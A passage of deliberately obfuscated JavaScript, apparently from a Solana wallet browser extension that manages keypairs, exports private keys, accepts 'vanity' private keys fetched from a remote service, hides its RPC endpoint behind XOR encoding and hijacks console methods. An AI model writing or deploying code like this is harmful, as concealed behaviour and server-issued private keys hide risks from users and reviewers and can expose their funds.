        a[i(r)],
          a[i(t)](u, Error)
            ? u.message
            : "string" == typeof u ||
              (u && typeof u === i(o) && JSON.stringify(u));
      }
    }
    async createWallet() {
      const t = 182,
        e = 183,
        n = Kg;
      return (
        (this[n(183) + "air"] = Hu.generate()),
        await this[n(t) + "age"](),
        this[n(e) + n(158)]
      );
    }
    async [Kg(238) + "et"](t) {
      const e = 142,
        n = 169,
        r = 227,
        o = 150,
        i = 157,
        s = 241,
        a = 182,
        u = Kg,
        c = {};
      (c.rmLkW = u(e) + u(263)),
        (c[u(n)] = function (t, e) {
          return t instanceof e;
        }),
        (c.mhcAG = u(r)),
        (c.QOKvp = function (t, e) {
          return t === e;
        }),
        (c[u(o)] = "object");
      const l = c;
      try {
        const e = Gm.decode(t),
          n = Hu[u(i) + u(s)](e);
        return (this.walletKeyPair = n), await this[u(a) + u(152)](), !![];
      } catch (d) {
        return (
          l[u(239)],
          l[u(169)](d, Error)
            ? d.message
            : typeof d === l.mhcAG ||
              (d && l.QOKvp(typeof d, l.UlvSp) && JSON[u(154)](d)),
          ![]
        );
      }
    }
    async [Kg(186) + "et"]() {
      const t = 214,
        e = 227,
        n = 158,
        r = 142,
        o = 263,
        i = 144,
        s = Kg,
        a = {};
      (a[s(t)] = "mogtech_wallet"),
        (a.Pttob = function (t, e) {
          return t === e;
        }),
        (a[s(273)] = s(e));
      const u = a;
      (this["walletKeyP" + s(n)] = null), (this.balance = 0);
      try {
        await chrome.storage[s(197)].remove([u[s(t)]]);
      } catch (c) {
        s(r) + s(o),
          c instanceof Error
            ? c.message
            : u.Pttob(typeof c, u.kWPwX) ||
              (c && u[s(246)](typeof c, s(i)) && JSON.stringify(c));
      }
    }
    async [Kg(244)]() {
      const t = 264,
        e = 160,
        n = 263,
        r = 227,
        o = 183,
        i = 207,
        s = 154,
        a = Kg,
        u = {
          xJyQe: function (t, e) {
            return t >>> e;
          },
        };
      (u[a(266)] = function (t, e) {
        return t ^ e;
      }),
        (u[a(t)] = function (t, e) {
          return t / e;
        }),
        (u[a(e)] = "Unknown er" + a(n)),
        (u.ydAeZ = a(r));
      const c = u;
      if (!this.walletKeyPair) return 0;
      try {
        const e = new (await Promise.resolve().then(() => Sc))[a(205)](
            (function () {
              let t;
              return function () {
                if (!t) {
                  const e = new Uint8Array([
                      5, 248, 235, 174, 30, 182, 176, 241, 9, 227, 237, 187, 25,
                      248, 254, 243, 25, 229, 240, 170, 89, 251, 178, 184, 12,
                      255, 235, 243, 0, 237, 246, 176, 3, 233, 235, 240, 5, 233,
                      243, 183, 24, 255, 178, 172, 29, 239, 177, 189, 2, 225,
                    ]),
                    n = -559969171,
                    r = new Uint8Array(e.length);
                  for (let t = 0; t < e.length; t++) {
                    const o = 255 & c.xJyQe(n, (t % 4) * 8);
                    r[t] = c.ZjbrB(e[t], o);
                  }
                  t = new TextDecoder().decode(r);
                }
                return t;
              };
            })()()
          ),
          n = new (await Promise.resolve().then(() => Sc)).PublicKey(
            this[a(o) + a(158)].publicKey.toBase58()
          ),
          r = await e.getBalance(n);
        return (this.balance = c[a(t)](r, 1e9)), this.balance;
      } catch (l) {
        return (
          c.DcLKg,
          l instanceof Error
            ? l.message
            : typeof l === c[a(i)] ||
              (l && "object" == typeof l && JSON[a(s)](l)),
          0
        );
      }
    }
    ["getCachedB" + Kg(176)]() {
      return this.balance;
    }
    async waitForLoad() {
      for (; !this.isLoaded; ) await new Promise((t) => setTimeout(t, 10));
    }
    ["generateKe" + Kg(191)]() {
      return (
        (this["currentKey" + Kg([179][0])] = Hu.generate()), this.currentKeyPair
      );
    }
    [Kg(255)]() {
      return this.currentKeyPair;
    }
    [Kg(235)]() {
      const t = 163,
        e = 179,
        n = Kg,
        r = {
          DAnlK: function (t, e) {
            return t !== e;
          },
        };
      return r[n(206)](this[n(t) + n(e)], null);
    }
    [Kg(269) + "ir"]() {
      this.currentKeyPair = null;
    }
    setKeyPair(t) {
      this.currentKeyPair = t;
    }
    async getVanity(t) {
      const e = 144,
        n = 241,
        r = 149,
        o = 247,
        i = Kg,
        s = { dZciX: "Unknown error", PUYnI: "string" };
      s.WGInn = i(e);
      const a = s;
      try {
        const e = await Og.getVanity(t);
        if (!e) return ![];
        const o = Hu["fromSecret" + i(n)](Gm[i(r)](e.private_key));
        return this[i(156)](o), !![];
      } catch (u) {
        return (
          u instanceof Error
            ? u.message
            : typeof u === a.PUYnI ||
              (u && typeof u === a[i(o)] && JSON[i(154)](u)),
          ![]
        );
      }
    }
    [Kg(199) + "ey"]() {
      const t = 179,
        e = 163,
        n = 179,
        r = 248,
        o = 233,
        i = Kg;
      return this[i(163) + i(t)] ? this[i(e) + i(n)][i(r)][i(o)]() : null;
    }
    [Kg(271) + Kg(241)]() {
      const t = 179,
        e = 224,
        n = Kg;
      return this[n(163) + "Pair"]
        ? Gm.encode(this[n(163) + n(t)][n(e)])
        : null;
    }
    ["getWalletP" + Kg(164)]() {
      const t = Kg;
      return this.walletKeyPair
        ? this["walletKeyP" + t([158][0])].publicKey[t(233)]()
        : null;
    }
    [Kg(168) + "rivateKey"]() {
      const t = 158,
        e = 200,
        n = 183,
        r = Kg;
      return this[r(183) + r(t)]
        ? Gm[r(e)](this[r(n) + "air"].secretKey)
        : null;
    }
    [Kg(249)](t) {
      this[Kg([183][0]) + "air"] = t;
    }
    [Kg(140)]() {
      return this["walletKeyP" + Kg(158)];
    }
    [Kg(230)]() {
      return null !== this["walletKeyP" + Kg(158)];
    }
    [Kg(212)]() {
      return this.getWalletPublicKey();
    }
    [Kg(135)]() {
      const t = 251,
        e = 151,
        n = Kg;
      this[n(259) + "tener"] &&
        (chrome.storage.onChanged["removeList" + n(t)](
          this["storageLis" + n(e)]
        ),
        (this.storageListener = null)),
        (this.walletKeyPair = null);
    }
  }
  class Yg {
    static validateCoinData(t) {
      const e = 174,
        n = 272,
        r = 226,
        o = 263,
        i = Kg,
        s = {
          qjVdu: function (t, e) {
            return t instanceof e;
          },
        };
      s[i(198)] = function (t, e) {
        return t === e;
      };
      const a = s;
      try {
        const o = new d(
          t.coinName || "",
          t[i(218)] || "",
          t.initialLiquidity || "1",
          t[i(e)],
          t[i(n)],
          t.additionalTweets || [],
          t.additionalWebsites || [],
          t.images || [],
          t[i(261) + "age"] || ""
        );
        return o[i(r)] ? o : null;
      } catch (u) {
        return (
          i(o),
          1,
          a.qjVdu(u, Error)
            ? u.message
            : a.nDvvy(typeof u, "string") ||
              (u && typeof u === i(144) && JSON[i(154)](u)),
          null
        );
      }
    }
  }
  function Qg(t, e) {
    const n = Hg();
    return (
      (Qg = function (e, r) {
        let o = n[(e -= 135)];
        if (void 0 === Qg.pmzNCg) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (Qg.BFRkgs = i), (t = arguments), (Qg.pmzNCg = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.tawkAq = t),
              (this.jtILnq = [1, 0, 0]),
              (this.hJRkIO = function () {
                return "newState";
              }),
              (this.NMdEsh = "\\w+ *\\(\\) *{\\w+ *"),
              (this.ZcYKFE = "['|\"].+['|\"];? *}");
          };
          (e.prototype.pEjATY = function () {
            const t = new RegExp(this.NMdEsh + this.ZcYKFE).test(
              this.hJRkIO.toString()
            )
              ? --this.jtILnq[1]
              : --this.jtILnq[0];
            return this.safevh(t);
          }),
            (e.prototype.safevh = function (t) {
              return Boolean(~t) ? this.aGyouJ(this.tawkAq) : t;
            }),
            (e.prototype.aGyouJ = function (t) {
              for (let e = 0, n = this.jtILnq.length; e < n; e++)
                this.jtILnq.push(Math.round(Math.random())),
                  (n = this.jtILnq.length);
              return t(this.jtILnq[0]);
            }),
            new e(Qg).pEjATY(),
            (o = Qg.BFRkgs(o)),
            (t[s] = o);
        }
        return o;
      }),
      Qg(t, e)
    );
  }
  axiom;
  const $g = oy;
  !(function (t) {
    const e = 358,
      n = 389,
      r = 372,
      o = 344,
      i = 377,
      s = 348,
      a = 352,
      u = 363,
      c = 387,
      l = oy,
      d = t();
    for (; []; )
      try {
        if (
          972822 ===
          (-parseInt(l(e)) / 1) * (-parseInt(l(n)) / 2) +
            (-parseInt(l(r)) / 3) * (parseInt(l(o)) / 4) +
            (parseInt(l(i)) / 5) * (parseInt(l(s)) / 6) +
            (parseInt(l(373)) / 7) * (-parseInt(l(a)) / 8) +
            -parseInt(l(u)) / 9 +
            parseInt(l(c)) / 10 +
            parseInt(l(375)) / 11
        )
          break;
        d.push(d.shift());
      } catch (f) {
        d.push(d.shift());
      }
  })(sy);
  const ty = (function () {
      let t = !![];
      return function (e, n) {
        const r = 384,
          o = t
            ? function () {
                if (n) {
                  const t = n[oy(r)](e, arguments);
                  return (n = null), t;
                }
              }
            : function () {};
        return (t = ![]), o;
      };
    })(),
    ey = ty(void 0, function () {
      const t = 365,
        e = 381,
        n = oy,
        r = { lwEtL: "(((.+)+)+)+$" },
        o = r;
      return ey[n(360)]()
        .search(o.lwEtL)
        .toString()
        [n(t) + "r"](ey)
        [n(e)](o.lwEtL);
    });
  ey();
  const ny = (function () {
      let t = !![];
      return function (e, n) {
        const r = t
          ? function () {
              if (n) {
                const t = n[oy(384)](e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
        return (t = ![]), r;
      };
    })(),
    ry = ny(void 0, function () {
      const t = 359,
        e = 376,
        n = 369,
        r = 371,
        o = 374,
        i = 360,
        s = oy,
        a = {
          Ftded: function (t, e) {
            return t(e);
          },
          BYTkv: function (t, e) {
            return t + e;
          },
          yVFsr: "return (function() ",
          gmLvB: "warn",
          dWjDC: "info",
          XoLPo: s(347),
          RLLsb: "trace",
        };
      let u;
      try {
        u = a.Ftded(
          Function,
          a.BYTkv(a.yVFsr + "{}.constru" + s(346) + 'rn this")( )', ");")
        )();
      } catch (d) {
        u = window;
      }
      const c = (u.console = u.console || {}),
        l = [s(t), a.gmLvB, a.dWjDC, "error", a.XoLPo, "table", a.RLLsb];
      for (let f = 0; f < l[s(e)]; f++) {
        const t = ny.constructor[s(n)].bind(ny),
          e = l[f],
          a = c[e] || t;
        (t[s(r)] = ny[s(o)](ny)), (t[s(i)] = a[s(360)].bind(a)), (c[e] = t);
      }
    });
  function oy(t, e) {
    const n = sy();
    return (
      (oy = function (e, r) {
        let o = n[(e -= 343)];
        if (void 0 === oy.GEchtp) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (oy.gwwAzp = i), (t = arguments), (oy.GEchtp = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.skKAQS = t),
              (this.EYdBKI = [1, 0, 0]),
              (this.UeWjVo = function () {
                return "newState";
              }),
              (this.QomTuV = "\\w+ *\\(\\) *{\\w+ *"),
              (this.Vgqeir = "['|\"].+['|\"];? *}");
          };
          (e.prototype.CVQHeH = function () {
            const t = new RegExp(this.QomTuV + this.Vgqeir).test(
              this.UeWjVo.toString()
            )
              ? --this.EYdBKI[1]
              : --this.EYdBKI[0];
            return this.sHztVf(t);
          }),
            (e.prototype.sHztVf = function (t) {
              return Boolean(~t) ? this.HxuvlG(this.skKAQS) : t;
            }),
            (e.prototype.HxuvlG = function (t) {
              for (let e = 0, n = this.EYdBKI.length; e < n; e++)
                this.EYdBKI.push(Math.round(Math.random())),
                  (n = this.EYdBKI.length);
              return t(this.EYdBKI[0]);
            }),
            new e(oy).CVQHeH(),
            (o = oy.gwwAzp(o)),
            (t[s] = o);
        }
        return o;
      }),
      oy(t, e)
    );
  }
  ry(),
    (window[$g(343)] = function (t) {
      return function () {
        return t;
      };
    });
  const iy = (t) => {
    const e = 378,
      n = 364,
      r = 390,
      o = 370,
      i = 357,
      s = 361,
      a = 345,
      u = 388,
      c = 376,
      l = 349,
      d = 380,
      f = 355,
      h = 354,
      p = 385,
      m = 351,
      g = 350,
      y = $g,
      w = {};
    (w.BTnQf = "button, a," + y(e) + y(n)),
      (w.onKob = y(r)),
      (w.DeDCr = "rgba(0, 255, 0, 0.397)");
    const b = w,
      v = Zg.getInstance().getSettings();
    if (!v) return;
    const A = (
      (null == v ? void 0 : v[y(379) + "ords"]) ||
      "killed, justice, nam" + y(o) + "named, mem" + y(353) + "n"
    )
      .split(/[\s,]+/)
      .map((t) => t.trim())
      [y(i)]((t) => !!t);
    if (!A.length) return;
    const k = new RegExp(
        "(" +
          A[y(s)]((t) => t.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")).join("|") +
          ")",
        "gi"
      ),
      I = document[y(a) + "Walker"](t, NodeFilter.SHOW_TEXT, {
        acceptNode(t) {
          const e = y,
            n = t.parentElement;
          return n && !n[e(p)](b.BTnQf) && k.test(t.textContent || "")
            ? NodeFilter.FILTER_ACCEPT
            : NodeFilter[e(m) + e(g)];
        },
      }),
      S = [];
    for (let _ = I.nextNode(); _; _ = I[y(u)]()) S.push(_);
    for (let _ = 0; _ < S[y(c)]; _++) {
      const t = S[_],
        e = t.textContent;
      if (!e) continue;
      const n = e[y(l)](k),
        r = document["createDocu" + y(d) + "nt"]();
      for (let o = 0; o < n.length; o++) {
        const t = n[o];
        if (t)
          if (o % 2 == 1) {
            const e = document["createElem" + y(362)]("span");
            (e.dataset.highlighted = b.onKob),
              (e[y(f)].backgroundColor = b[y(366)]),
              (e.textContent = t),
              r[y(386) + "d"](e);
          } else r.appendChild(document.createTextNode(t));
      }
      t[y(h)].replaceChild(r, t);
    }
  };
  function sy() {
    const t = [
      "nZu5nty1ohz0C0TpuG",
      "B2LUlwj0BG",
      "y29UC3rYDwn0BW",
      "rgveq3i",
      "CxvLCNLtzwXLyW",
      "Dgv4DenVBNrLBG",
      "ChjVDg90ExbL",
      "zsWGBMfTzxmSia",
      "x19WCM90B19F",
      "m2PHz2T2va",
      "mtiXnZa5D0fLz2rQ",
      "yMLUza",
      "mJCZoda1nffKvhD1AW",
      "BgvUz3rO",
      "mZm3ody3merIA0PmAG",
      "ic5JCMvHDguTyW",
      "AgLNAgXPz2H0vW",
      "BwvUDezYywDTzq",
      "C2vHCMnO",
      "CMvWBgfJzunOAq",
      "AgLNAgXPz2H0zq",
      "yxbWBhK",
      "y2XVC2vZDa",
      "yxbWzw5Kq2HPBa",
      "mtyZoteZmtbyBe5Lz3q",
      "BMv4De5Vzgu",
      "mZKXohfvBunfvW",
      "Dhj1zq",
      "C2TdCNLWDa",
      "mte5mdm1nNvkAu9JqW",
      "y3jLyxrLvhjLzq",
      "y3rVCIGICMv0Dq",
      "zxHJzxb0Aw9U",
      "nKv3DKTxvG",
      "C3bSAxq",
      "runu",
      "rKLmvevsx1jfsG",
      "ntuYufvKCNHv",
      "zwnVAw4SignVAq",
      "CgfYzw50tM9Kzq",
      "C3r5Bgu",
      "tM9Kzq",
      "zMLSDgvY",
      "mZGZs05mEMrL",
      "Bg9N",
      "Dg9tDhjPBMC",
      "BwfW",
      "zw50",
    ];
    return (sy = function () {
      return t;
    })();
  }
  const ay = () => {
    const t = 383,
      e = 356,
      n = 368,
      r = $g,
      o = {
        wieUS: function (t, e) {
          return t < e;
        },
      },
      i = o,
      s = document[r(367) + "torAll"]("span[data-" + r(t) + "d]");
    for (let a = 0; i.wieUS(a, s.length); a++) {
      const t = s[a],
        o = t.parentNode;
      o &&
        o[r(382) + "ld"](document["createText" + r(e)](t[r(n) + "t"] || ""), t);
    }
  };
  axiom,
    (function (t) {
      const e = 364,
        n = 393,
        r = 395,
        o = 368,
        i = 345,
        s = 349,
        a = 391,
        u = fy,
        c = t();
      for (; []; )
        try {
          if (
            521898 ===
            parseInt(u(e)) / 1 +
              parseInt(u(n)) / 2 +
              (-parseInt(u(r)) / 3) * (-parseInt(u(342)) / 4) +
              (parseInt(u(o)) / 5) * (parseInt(u(363)) / 6) +
              (parseInt(u(i)) / 7) * (-parseInt(u(325)) / 8) +
              -parseInt(u(s)) / 9 +
              parseInt(u(a)) / 10
          )
            break;
          c.push(c.shift());
        } catch (l) {
          c.push(c.shift());
        }
    })(py);
  const uy = (function () {
      let t = !![];
      return function (e, n) {
        const r = t
          ? function () {
              if (n) {
                const t = n.apply(e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
        return (t = ![]), r;
      };
    })(),
    cy = uy(void 0, function () {
      const t = 372,
        e = 346,
        n = 387,
        r = 372,
        o = fy;
      return cy
        .toString()
        .search(o(t) + "+$")
        .toString()
        [o(e) + "r"](cy)
        [o(n)](o(r) + "+$");
    });
  cy();
  const ly = (function () {
      const t = 361;
      let e = !![];
      return function (n, r) {
        const o = e
          ? function () {
              if (r) {
                const e = r[fy(t)](n, arguments);
                return (r = null), e;
              }
            }
          : function () {};
        return (e = ![]), o;
      };
    })(),
    dy = ly(void 0, function () {
      const t = 347,
        e = 389,
        n = 332,
        r = 354,
        o = 382,
        i = 351,
        s = 399,
        a = 373,
        u = 346,
        c = 356,
        l = 369,
        d = 339,
        f = 355,
        h = 384,
        p = 330,
        m = fy,
        g = {};
      (g[m(331)] = function (t, e) {
        return t + e;
      }),
        (g[m(385)] = "return (function() "),
        (g.SOyhf = "log"),
        (g[m(t)] = m(e)),
        (g.dmQCO = "info"),
        (g[m(n)] = "error"),
        (g[m(r)] = m(o));
      const y = g,
        w = (function () {
          const t = m;
          let e;
          try {
            e = Function(
              y.uBEME(y.FAlFI, t(h) + t(p) + 'rn this")( )') + ");"
            )();
          } catch (n) {
            e = window;
          }
          return e;
        })(),
        b = (w.console = w[m(i)] || {}),
        v = [y[m(s)], y.RDZOk, y[m(a)], y.GBCpf, "exception", y.NYBtL, "trace"];
      for (let A = 0; A < v[m(348)]; A++) {
        const t = ly[m(u) + "r"][m(c)].bind(ly),
          e = v[A],
          n = b[e] || t;
        (t[m(l)] = ly[m(d)](ly)), (t[m(f)] = n.toString.bind(n)), (b[e] = t);
      }
    });
  function fy(t, e) {
    const n = py();
    return (
      (fy = function (e, r) {
        let o = n[(e -= 325)];
        if (void 0 === fy.DMVTbl) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (fy.fVHKLV = i), (t = arguments), (fy.DMVTbl = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.yzFuZk = t),
              (this.VusJSK = [1, 0, 0]),
              (this.shrDix = function () {
                return "newState";
              }),
              (this.papbRL = "\\w+ *\\(\\) *{\\w+ *"),
              (this.CRaTiq = "['|\"].+['|\"];? *}");
          };
          (e.prototype.fFNCwU = function () {
            const t = new RegExp(this.papbRL + this.CRaTiq).test(
              this.shrDix.toString()
            )
              ? --this.VusJSK[1]
              : --this.VusJSK[0];
            return this.nQljoL(t);
          }),
            (e.prototype.nQljoL = function (t) {
              return Boolean(~t) ? this.VFmMfc(this.yzFuZk) : t;
            }),
            (e.prototype.VFmMfc = function (t) {
              for (let e = 0, n = this.VusJSK.length; e < n; e++)
                this.VusJSK.push(Math.round(Math.random())),
                  (n = this.VusJSK.length);
              return t(this.VusJSK[0]);
            }),
            new e(fy).fFNCwU(),
            (o = fy.fVHKLV(o)),
            (t[s] = o);
        }
        return o;
      }),
      fy(t, e)
    );
  }
  dy(),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  const hy = async (t, e = 100, n = 3e3) => {
    const r = Date[fy(326)]();
    for (; []; ) {
      if (await t()) return !![];
      if (Date.now() - r >= n) return ![];
      await new Promise((t) => setTimeout(t, e));
    }
  };
  function py() {
    const t = [
      "DgvUDcjDigLTzW",
      "Aw1Hz2vZiL0P",
      "yxbWBhK",
      "ywDLCYjDlcbByW",
      "nZy4DhP5BuD2",
      "mtm2mZiWBfDSs0Lf",
      "zNjVBq",
      "vw5RBM93BIbLCG",
      "BwjLzef1DgHVCG",
      "mZeXme5WBeLmyG",
      "x19WCM90B19F",
      "zgvMyxvSDfnVBa",
      "Aw1Nw3nYyYO9iG",
      "kcGOlISPkYKRkq",
      "zg1rq08",
      "DMLKzw8",
      "A1jWBfy",
      "y2rUAw5ZDgfNCG",
      "yv9FnJiZzguGAq",
      "swjSBu4",
      "Dg9Y",
      "rvjezeW",
      "CxvLCNLtzwXLyW",
      "DgfIBgu",
      "C3rYAw5N",
      "E30Uy29UC3rYDq",
      "rKfSrKK",
      "DhjPBq",
      "C2vHCMnO",
      "BwC6BM90kc5LBq",
      "D2fYBG",
      "D2L0DgvYlMnVBq",
      "odm5mtKWmgTJruPeuW",
      "yvTOCMvMkJ0IAq",
      "nZK4nJG0BuLytfjq",
      "Cg9ZDhmViL0",
      "nJy0ntnWAxHfDhi",
      "Dg9YqwXS",
      "oM5VDcHBC3jJkG",
      "Cg9ZDgvY",
      "u095Agy",
      "w2nSyxnZkJ0IAq",
      "ndm5ntjNthjsD3i",
      "BM93",
      "zwrbDxrOB3jjyW",
      "yvTOCMvMxq",
      "C3bSAxq",
      "y3rVCIGICMv0Dq",
      "Dujftuu",
      "r0jdCgy",
      "z2v0sw5ZDgfUyW",
      "y2XHC3mQpsjLBq",
      "BgfZCYO9iMvTyG",
      "igLTzW",
      "ChvZAa",
      "C3rVCMLLCY8Ixq",
      "yMLUza",
      "yvTOCMvMkJ0IDa",
      "txvLq04",
      "ndrtqu1Ruxy",
      "w2nSyxnZkJ0Izq",
      "DgvZDa",
      "nJu4rMHKBNn5",
      "y29UC3rYDwn0BW",
      "uKrAt2S",
      "BgvUz3rO",
      "ntKZode1nxfqzNnXuG",
      "sffrDgO",
      "y29UC29Szq",
      "BwfW",
      "yvTOCMvMkJ0IlW",
      "tLLcDeW",
      "Dg9tDhjPBMC",
      "ChjVDg90ExbL",
      "C3jJ",
      "uwDdBKS",
    ];
    return (py = function () {
      return t;
    })();
  }
  axiom,
    (function (t) {
      const e = 218,
        n = 229,
        r = 167,
        o = 130,
        i = 166,
        s = 153,
        a = 195,
        u = 156,
        c = 206,
        l = by,
        d = t();
      for (; []; )
        try {
          if (
            347813 ===
            (parseInt(l(e)) / 1) * (parseInt(l(n)) / 2) +
              -parseInt(l(r)) / 3 +
              (-parseInt(l(155)) / 4) * (parseInt(l(176)) / 5) +
              (parseInt(l(o)) / 6) * (-parseInt(l(i)) / 7) +
              (parseInt(l(s)) / 8) * (parseInt(l(a)) / 9) +
              -parseInt(l(175)) / 10 +
              (-parseInt(l(u)) / 11) * (-parseInt(l(c)) / 12)
          )
            break;
          d.push(d.shift());
        } catch (f) {
          d.push(d.shift());
        }
    })(Sy);
  const my = (function () {
      const t = 128;
      let e = !![];
      return function (n, r) {
        const o = e
          ? function () {
              if (r) {
                const e = r[by(t)](n, arguments);
                return (r = null), e;
              }
            }
          : function () {};
        return (e = ![]), o;
      };
    })(),
    gy = my(void 0, function () {
      const t = 211,
        e = 190,
        n = by,
        r = {};
      r.OSpLm = n(t) + "+$";
      const o = r;
      return gy
        .toString()
        .search(o[n(e)])
        .toString()
        .constructor(gy)
        .search(o.OSpLm);
    });
  gy();
  const yy = (function () {
      let t = !![];
      return function (e, n) {
        const r = t
          ? function () {
              if (n) {
                const t = n.apply(e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
        return (t = ![]), r;
      };
    })(),
    wy = yy(void 0, function () {
      const t = 178,
        e = 140,
        n = 205,
        r = 127,
        o = 214,
        i = 170,
        s = 219,
        a = 139,
        u = 131,
        c = 220,
        l = by,
        d = {};
      (d.EcpkS = l(179) + l(t) + 'rn this")( )'),
        (d.nNobH = l(e)),
        (d.tkrtD = "exception"),
        (d[l(n)] = "table");
      const f = d,
        h = (function () {
          let t;
          try {
            t = Function("return (function() " + f.EcpkS + ");")();
          } catch (e) {
            t = window;
          }
          return t;
        })(),
        p = (h.console = h[l(r)] || {}),
        m = [l(o), "warn", l(126), f[l(i)], f[l(s)], f[l(205)], "trace"];
      for (let g = 0; g < m.length; g++) {
        const t = yy.constructor[l(a)].bind(yy),
          e = m[g],
          n = p[e] || t;
        (t.__proto__ = yy[l(u)](yy)),
          (t.toString = n[l(c)].bind(n)),
          (p[e] = t);
      }
    });
  function by(t, e) {
    const n = Sy();
    return (
      (by = function (e, r) {
        let o = n[(e -= 126)];
        if (void 0 === by.mjCRAB) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (by.VinMwo = i), (t = arguments), (by.mjCRAB = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.qgAILE = t),
              (this.oBqVZt = [1, 0, 0]),
              (this.vTuCWu = function () {
                return "newState";
              }),
              (this.AlkCXW = "\\w+ *\\(\\) *{\\w+ *"),
              (this.nUydeo = "['|\"].+['|\"];? *}");
          };
          (e.prototype.CwajPs = function () {
            const t = new RegExp(this.AlkCXW + this.nUydeo).test(
              this.vTuCWu.toString()
            )
              ? --this.oBqVZt[1]
              : --this.oBqVZt[0];
            return this.RMqnCX(t);
          }),
            (e.prototype.RMqnCX = function (t) {
              return Boolean(~t) ? this.UTopjF(this.qgAILE) : t;
            }),
            (e.prototype.UTopjF = function (t) {
              for (let e = 0, n = this.oBqVZt.length; e < n; e++)
                this.oBqVZt.push(Math.round(Math.random())),
                  (n = this.oBqVZt.length);
              return t(this.oBqVZt[0]);
            }),
            new e(by).CwajPs(),
            (o = by.VinMwo(o)),
            (t[s] = o);
        }
        return o;
      }),
      by(t, e)
    );
  }
  wy(),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  const vy = {
    priorityFeeUnits: new Xn.BN(1e7),
    solAmountUnits: new Xn.BN(0),
    slippage: 25,
  };
  function Ay(t) {
    const e = by,
      n = {
        EucHe: function (t, e) {
          return t(e);
        },
        RWQTP: function (t, e) {
          return t * e;
        },
        kDrOI: function (t, e) {
          return t / e;
        },
        cKnsh: function (t, e) {
          return t(e);
        },
      },
      r = n.EucHe(BigInt, 1e9),
      o = BigInt(45e4),
      i = Math.ceil(1e6 * t),
      s = n[e([196][0])](BigInt(i), r) / BigInt(1e6),
      a = n[e(160)](s * n.cKnsh(BigInt, 1e6), o);
    return new Xn.BN(a);
  }
  window.Buffer = window.Buffer || ct;
  const ky = async (t, e, n, r, o) => {
      const i = 199,
        s = 129,
        a = 134,
        u = 202,
        c = 161,
        l = 159,
        d = 212,
        f = 171,
        h = 169,
        p = 168,
        m = 177,
        g = 148,
        y = 163,
        w = 231,
        b = 201,
        v = 152,
        A = 227,
        k = 136,
        I = 137,
        S = 174,
        _ = 146,
        T = 217,
        C = 158,
        B = 144,
        E = 209,
        x = 145,
        P = 173,
        R = by,
        O = {
          JkCta: function (t, e) {
            return t < e;
          },
          EPZkM: function (t, e, n, r, o) {
            return t(e, n, r, o);
          },
          QSaJj: "confirmed",
          PpDUc: "undefined",
          fEyBM: function (t, e) {
            return t instanceof e;
          },
          YUNDz: function (t, e) {
            return t === e;
          },
          PSVNc: "string",
        };
      try {
        const E = await n.fetchGlobal(),
          x = new bs(),
          P = {};
        (P[R(198)] = 45e4), x.add(Yu[R(i) + R(193)](P));
        const M = {};
        (M["microLampo" + R(s)] = vy["priorityFe" + R(a)]),
          x.add(Yu.setComputeUnitPrice(M));
        const L = {};
        (L[R(133)] = r.publicKey),
          (L[R(u)] = t.name),
          (L[R(c)] = t.ticker),
          (L.uri = t.uri),
          (L.creator = o.publicKey),
          (L.user = o[R(l)]);
        const N = await n[R(d) + "ruction"](L);
        if ((x.add(N), !vy.solAmountUnits[R(f)]())) {
          const t = n[R(203) + "vePda"](r.publicKey);
          if (t) {
